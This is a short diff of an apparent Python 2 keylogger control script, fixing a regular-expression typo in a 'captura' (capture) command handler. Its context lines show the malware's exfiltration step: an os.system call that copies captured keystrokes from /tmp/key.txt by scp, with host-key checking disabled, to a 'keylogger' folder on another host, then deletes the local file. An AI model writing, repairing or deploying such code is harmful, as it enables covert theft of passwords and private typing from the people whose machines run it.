@@ -55,7 +55,7 @@ for c in comandos:
                 os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.13:~/keylogger/ 1>/dev/null')
                 os.system('rm -f /tmp/key.txt')
     
-    elif re.match('captura (\-[tn]{1,1}) (\d+))',c):
+    elif re.match('captura (\-[tn]{1,1}) (\d+)',c):
 		print c+"\n"
                 mo = re.match('captura (\-[tn]{1,1}) (\d+)',c);
                 captura.tiempo(mo.group(1),mo.group(2))
